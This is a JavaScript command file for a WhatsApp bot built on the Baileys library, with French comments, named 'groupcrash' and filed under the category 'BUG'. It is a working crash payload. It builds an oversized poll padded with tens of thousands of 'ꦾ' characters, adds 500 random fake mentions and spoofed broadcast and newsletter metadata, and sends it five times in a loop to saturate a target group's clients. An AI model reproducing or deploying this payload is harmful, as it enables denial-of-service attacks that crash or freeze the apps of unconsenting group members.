import { generateWAMessageFromContent } from "@whiskeysockets/baileys";

export default {
  name: "groupcrash",
  alias: ["gcrash", "crashgroup"],
  description: "Envoie une charge de saturation lourde pour cibler un groupe (Owner Only)",
  category: "BUG",
  group: true, // Réservé aux groupes
  admin: false,
  botAdmin: false,
  ownerOnly: true,

  async execute(kaya, mek, from, args, prefix) {
    try {
      // 🔐 Vérification sécurisée de l'Owner
      const ownerId = kaya.user?.id ? kaya.user.id.split(':')[0] : '';
      if (!ownerId) {
        return await kaya.sendMessage(from, { text: "❌ Erreur : Impossible de récupérer l'ID du propriétaire du bot." }, { quoted: mek });
      }

      await kaya.sendMessage(from, { text: "⚡ Déploiement de la charge de saturation sur le groupe..." }, { quoted: mek });

      // Génération d'une charge utile lourde basée sur un sondage surchargé et des métadonnées corrompues
      const heavyPayload = {
        pollCreationMessage: {
          name: "💥 KAYA BOT GROUP STRESS TEST 💥\n" + "ꦾ".repeat(10000),
          options: [
            { optionName: "🔥 " + "ꦾ".repeat(2000) },
            { optionName: "⚡ " + "ꦾ".repeat(2000) }
          ],
          selectableOptionsCount: 1
        },
        contextInfo: {
          mentionedJid: Array.from({ length: 500 }, () => `1${Math.floor(Math.random() * 8999999 + 1000000)}@s.whatsapp.net`),
          participant: "0@s.whatsapp.net",
          remoteJid: "status@broadcast",
          forwardedNewsletterMessageInfo: {
            newsletterName: "KAY BOT ENGINE",
            newsletterJid: "120363229235889246@newsletter",
            serverMessageId: 999999
          }
        }
      };

      // Boucle rapide pour saturer le buffer du groupe
      for (let i = 0; i < 5; i++) {
        const msg = generateWAMessageFromContent(from, heavyPayload, {
          userJid: kaya.user.id
        });

        await kaya.relayMessage(from, msg.message, {
          messageId: msg.key.id
        });

        await new Promise(resolve => setTimeout(resolve, 300));
      }

      await kaya.sendMessage(from, { text: "⚡ Saturation du groupe envoyée avec succès !" }, { quoted: mek });

    } catch (err) {
      console.error("❌ Erreur dans groupcrash :", err);
      await kaya.sendMessage(from, { text: `Erreur d'exécution : ${err.message}` }, { quoted: mek });
    }
  }
};
